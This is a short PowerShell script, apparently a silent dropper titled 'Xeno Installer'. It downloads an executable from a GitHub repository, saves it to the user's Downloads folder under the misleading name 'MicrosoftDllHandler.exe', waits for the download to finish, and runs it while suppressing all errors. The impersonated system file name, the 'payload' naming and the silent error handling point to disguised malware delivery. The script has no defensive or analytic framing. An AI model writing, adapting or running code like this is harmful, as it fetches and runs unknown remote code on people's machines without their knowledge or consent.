# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"

try {
    # Download the file
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    $webClient.Dispose()
    
    # Wait for file system to settle (icon, metadata, etc.)
    Start-Sleep -Seconds 3
    
    # Verify file is fully written and matches server size
    $serverSize = (Invoke-WebRequest -Uri $payloadUrl -Method Head -UseBasicParsing).Headers['Content-Length']
    $localSize = (Get-Item $payloadPath).Length
    
    while ($localSize -ne $serverSize) {
        Start-Sleep -Seconds 1
        $localSize = (Get-Item $payloadPath).Length
    }
    
    # Extra settling time for file system
    Start-Sleep -Seconds 2
    
    # Execute only when fully ready
    Start-Process -FilePath $payloadPath
} catch {}
